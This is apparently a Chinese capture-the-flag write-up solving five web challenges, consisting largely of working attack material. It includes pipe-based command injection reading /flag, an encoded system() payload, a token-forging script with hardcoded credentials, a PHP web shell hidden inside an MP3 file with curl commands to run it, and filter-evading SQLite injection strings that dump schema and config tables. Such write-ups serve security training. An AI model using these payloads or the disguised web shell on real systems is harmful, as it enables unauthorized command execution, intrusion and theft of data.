## DD加速器
可以利用管道符来执行命令，比如输入`127.0.0.1|whoami`返回www-data,利用这一点输入`127.0.0.1|ls /`查看根目录，发现根目录里有一个flag文件，输入`127.0.0.1|cat /flag`输出flag{not_here!}这明显是一个错误的，输入`127.0.0.1|ls -la /`查看根目录完整信息，发现有一个.开头的文件说明这是隐藏文件，输入`127.0.0.1|ls /.fyaq7lnzsu9aflycnlklj96p83vmgwe8`后发现目标地址长度超过限制，可以用通配符`*`缩短路径，输入`127.0.0.1|ls /.fy*`查找到一个flag文件，输出文件内容`127.0.0.1|cat /.fy*/flag`得到flag
## 真的是签到诶
代码审计可知是发送post请求，cipher=,先对输入的参数进行base64解密，再利用atbash加密(对字母前后对换a-z,B-Y),再去除空格，最后用rot13加密，将最后的参数作为命令执行，可以执行`system('cat${IFS}/flag');` `${IFS}`可以代替空格，对这句代码逆向操作，先用rot13解码为`flfgrz('png${VSF}/synt');`再用atbash解密为`uoutia('kmt${EHU}/hbmg');`最后用base64加密为`dW91dGlhKCdrbXQke0VIVX0vaGJtZycpOw==`发送post请求`cipher=dW91dGlhKCdrbXQke0VIVX0vaGJtZycpOw==`得到flag
## 搞点哦润吉吃吃橘
可以在开发者界面元素里找到账户名与密码，登陆成功后要通过脚本提交，因为计算用到时间戳，用抓包即使不放包服务器的时间也在流动，手动计算不可能的。可以写一个Python脚本
```python
#!/usr/bin/env python3  
# doro_start_and_verify.py  
# 自动：登录 -> 触发 start (尝试多个路径) -> 获取 challenge -> 计算 candidate token -> 提交  
  
import requests, time, re, json  
from urllib.parse import urljoin  
  
BASE = "https://eci-2zebayz88x9eztqroe5u.cloudeci1.ichunqiu.com:5000"  
LOGIN_PATH = "/login"  
START_CANDIDATES = [  
    "/start", "/start_verification", "/begin", "/challenge/start",  
    "/get_challenge", "/begin_challenge", "/start_challenge", "/api/challenge/start"  
]  
VERIFY_PATH = "/verify_token"  
SUBMIT_CANDIDATES = [VERIFY_PATH, "/submit_verification", "/verify", "/submit", "/challenge/submit", "/api/challenge/submit"]  
  
USERNAME = "Doro"  
PASSWORD = "Doro_nJlPVs_@123"  
  
TIMEOUT = 3.0  
VERIFY_SSL = False  
  
# prepare session with Safari UA  
s = requests.Session()  
s.verify = VERIFY_SSL  
s.headers.update({  
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "  
                  "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",  
    "Accept": "application/json, text/javascript, */*; q=0.01",  
    "Referer": BASE + "/"  
})  
if not VERIFY_SSL:  
    import urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
  
def login():  
    url = urljoin(BASE, LOGIN_PATH)  
    try:  
        r = s.post(url, data={"username": USERNAME, "password": PASSWORD}, timeout=TIMEOUT)  
    except Exception as e:  
        print("[!] login exception:", e)  
        return False  
    print("[*] login ->", r.status_code)  
    # show preview for debug  
    print(r.text[:400])  
    # success heuristics: 200 + Set-Cookie or success text  
    if r.status_code == 200 and ("成功" in r.text or "logout" in r.text.lower() or "欢迎" in r.text):  
        return True  
    # accept if set-cookie present  
    if any(h.lower().startswith("set-cookie:") for h in r.headers.keys()):  
        return True  
    return False  
def trigger_start():  
    """尝试触发 start，返回 (json_or_text_response, rtt, used_start_path) 或 (None, resp, path) 表示失败但有响应"""  
    for p in START_CANDIDATES:  
        url = urljoin(BASE, p)  
        try:  
            t0 = time.time()  
            r = s.post(url, timeout=TIMEOUT)  
            t1 = time.time()  
        except Exception as e:  
            # print("[!] start try exception", p, e)  
            continue  
        rtt = t1 - t0  
        print(f"[*] try start -> {url} status={r.status_code} rtt={rtt:.3f}s")  
        preview = (r.text or "")[:400]  
        print("[*] preview:", preview)  
        # Accept JSON with expression or 200 with body containing 'expression' or multiplier/xor  
        ct = r.headers.get("Content-Type","")  
        if r.status_code == 200 and ("application/json" in ct or '"expression"' in (r.text or "") or "token =" in (r.text or "")):  
            try:  
                j = r.json()  
                return j, rtt, p  
            except Exception:  
                # return raw text as fallback  
                return r.text, rtt, p  
        # if returned 401/400 with message asking to start, continue trying others  
    return None, None, None  
  
def parse_challenge(resp):  
    """从 JSON 或文本解析 multiplier/xor及可选server_ts"""  
    if isinstance(resp, dict):  
        j = resp  
        expr = j.get("expression")  
        mult = j.get("multiplier") or j.get("mul")  
        xor = j.get("xor_value") or j.get("xor")  
        if expr:  
            m = re.search(r'\(?\s*(\d+)\s*\*\s*(\d+)\s*\)\s*\^\s*(0x[0-9a-fA-F]+|\d+)', expr)  
            if m:  
                server_ts = int(m.group(1)); multiplier = int(m.group(2))  
                xor_val = int(m.group(3), 16) if m.group(3).startswith("0x") else int(m.group(3))  
                return {"multiplier":multiplier, "xor":xor_val, "server_ts":server_ts, "raw":j}  
        if mult and xor:  
            xor_val = int(xor,16) if isinstance(xor,str) and xor.startswith("0x") else int(xor)  
            return {"multiplier":int(mult), "xor":xor_val, "server_ts": j.get("server_time") if isinstance(j,dict) else None, "raw":j}  
    else:  
        text = str(resp)  
        m = re.search(r'\(?\s*(\d+)\s*\*\s*(\d+)\s*\)\s*\^\s*(0x[0-9a-fA-F]+|\d+)', text)  
        if m:  
            server_ts = int(m.group(1)); multiplier = int(m.group(2))  
            xor_val = int(m.group(3),16) if m.group(3).startswith("0x") else int(m.group(3))  
            return {"multiplier":multiplier, "xor":xor_val, "server_ts":server_ts, "raw":None}  
    raise ValueError("无法解析 challenge 响应")  
  
def compute_candidates(multiplier, xor_val, rtt=0.0, window=2):  
    now = int(time.time())  
    offset = int(round(rtt/2.0)) if rtt else 0  
    base = now + offset  
    cands = []  
    for dt in range(-1, window+1):  
        ts = base + dt  
        token = (ts * multiplier) ^ xor_val  
        cands.append((ts, token))  
    return cands  
  
def try_submit(token, extras=None):  
    extras = extras or {}  
    for p in SUBMIT_CANDIDATES:  
        url = urljoin(BASE, p)  
        try:  
            payload = {"token": str(token)}  
            payload.update(extras)  
            # JSON 提交  
            r = s.post(url, json=payload, timeout=TIMEOUT,  
                       headers={"Content-Type": "application/json"})  
            print(f"[*] submit JSON {url} -> {r.status_code}")  
            print("[*] resp preview:", (r.text or "")[:400])  
            txt = (r.text or "").lower()  
            if r.status_code in (200, 201) and ("成功" in txt or "flag" in txt or "congrat" in txt):  
                return True, r  
        except Exception as e:  
            print("[!] submit exception", e)  
    return False, None  
  
  
  
def main():  
    print("[*] 开始（目标：", urljoin(BASE, VERIFY_PATH), ")")  
    if not login():  
        print("[!] 登录失败，退出")  
        return  
  
    # 触发 start    resp, rtt, used = trigger_start()  
    if resp is None:  
        print("[!] 未能触发 start（所有候选路径都失败）。请在浏览器中点击“开始验证”，然后在 Network 里 Copy as cURL 把请求粘给我。")  
        return  
    print("[*] start 成功，使用路径:", used)  
  
    # 解析 challenge    try:  
        parsed = parse_challenge(resp)  
    except Exception as e:  
        print("[!] 解析 challenge 失败:", e)  
        print("resp preview:", str(resp)[:800])  
        return  
    print("[*] parsed:", parsed)  
  
    # 生成候选并提交  
    multiplier = parsed["multiplier"]; xor_val = parsed["xor"]  
    candidates = compute_candidates(multiplier, xor_val, rtt=rtt or 0.0, window=2)  
    print("[*] candidates:")  
    for ts, tok in candidates:  
        print(" ts=", ts, " token=", tok)  
    for ts, tok in candidates:  
        ok, r = try_submit(tok)  
        if ok:  
            print("[+] 提交成功，响应：", r.text)  
            return  
    print("[!] 所有 candidate 提交完成，未探测到明显成功标志。把最后一次 submit 的响应和 start 的完整响应贴给我我来精调。")  
  
if __name__ == "__main__":  
    main()
```

关闭代理后运行即可返回flag,确保url是最新的，不能过期，运行成功后即可返回flag.

## 白帽小K的故事（1）
根据提示查看源代码，发现
```html
// TODO：
        // 小岸同学到时候记得把这个函数删掉
        async function fetchload(file) {
            try {
                const res = await fetch('/v1/onload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `file=${encodeURIComponent(file)}`
                });
                const data = await res.json();
                if (data.success) {
                    console.log('File content:', data.success);
                } else {
                    console.error('Error loading file:', data.error);
                }
            } catch (e) {
                console.error('Request failed', e);
            }
        }

        fetchList();
```
发现隐藏接口/v1/onload,和'Content-Type': 'application/x-www-form-urlencoded'，提示还说和文件上传有关，可以利用010editor将php代码放到MP3文件里，
```php
<?php

// POST 后门：通过 POST 发送 cmd 或 read

// 用法：POST file=shell.php.mp3&cmd=id

if (isset($_POST['cmd'])) {

    echo "<pre>";

    // 使用 passthru/system/exec 任选一种（system 通常足够）

    system($_POST['cmd']);

    echo "</pre>";

    exit;

}

  

if (isset($_POST['read'])) {

    $p = $_POST['read'];

    echo "<pre>";

    if (is_file($p)) {

        // 防止 HTML 渲染，方便查看

        echo htmlspecialchars(file_get_contents($p));

    } else {

        echo "no such file: " . htmlspecialchars($p) . "\n";

    }

    echo "</pre>";

    exit;

}

  

// 停止后续 PHP 解析，之后可附加任意二进制（如 ID3/mp3 数据）

__halt_compiler();

?>
```
放到开头位置，`__halt_compiler();`可以终止php解析， 再将MP3文件上传到网站中，文件名为shell.php.mp3,接下来在kail-linux中执行 `curl -i -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3"`其中host为容器网址,返回{"success":""}证明`POST /v1/onload` 能读取 （还可以试一下file=../flag和file=../../../../etc/passwd但都没成功）`uploads/shell.php.mp3`（返回 `{"success":""}` 表示接口能找到文件）但内容为空，因为文件是二进制或接口没把内容以可读文本返回，因为用read=../flag无效，所以用cmd=cat读取，执行代码
```cmd
HOST="https://eci-2ze5ozcaf7j5l2sqr5qp.cloudeci1.ichunqiu.com:80"

# 试常见位置
curl -s -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3&cmd=cat%20../flag" -o out1.bin; strings out1.bin | sed -n '1,200p'

curl -s -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3&cmd=cat%20../../flag" -o out2.bin; strings out2.bin | sed -n '1,200p'

curl -s -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3&cmd=cat%20/flag" -o out3.bin; strings out3.bin | sed -n '1,200p'

curl -s -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3&cmd=cat%20/var/www/flag" -o out4.bin; strings out4.bin | sed -n '1,200p'

curl -s -X POST "$HOST/v1/onload" -H "Content-Type: application/x-www-form-urlencoded" --data "file=uploads/shell.php.mp3&cmd=cat%20/var/www/html/flag" -o out5.bin; strings out5.bin | sed -n '1,200p'
```
最后输出flag
## 小E的管理系统
根据爆破，发现过滤了
```
' / 空格 + % = ; " , /**/ && -- 
```
空格用`%0a`代替，逗号用join。因为`%0a`是换行符，本身有注释的效果。database()不能用`sqlite_version()`所以用的是sqlite数据库。
```
?id=1%0aorder%0aby%0a6  判断出有5列
?id=1%0aunion%0aselect%0a*%0afrom%0a((select%0a1)A%0ajoin%0a(select%0a2)B%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0asqlite_version())E)  
id=1%0aunion%0aselect%0a*%0afrom%0a((select%0a1)A%0ajoin%0a(select%0a2)B%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0agroup_concat(name)%0afrom%0asqlite_master)E) 
这个回显node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence

1%0aunion%0aselect%0a*%0afrom%0a((select%0a1)A%0ajoin%0a(select%0a2)B%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0asql%0afrom%0asqlite_master%0alimit%0a1%0aoffset%0a0)E)
这个回显
CREATE TABLE node_status (\n node_id INTEGER PRIMARY KEY,\n cpu_usage VARCHAR(10),\n ram_usage VARCHAR(10),\n status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)

1%0aunion%0aselect%0a*%0afrom%0a((select%0a1)A%0ajoin%0a(select%0a2)B%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0agroup_concat(config_value)F%0afrom%0asys_config)E)
拿到flag
```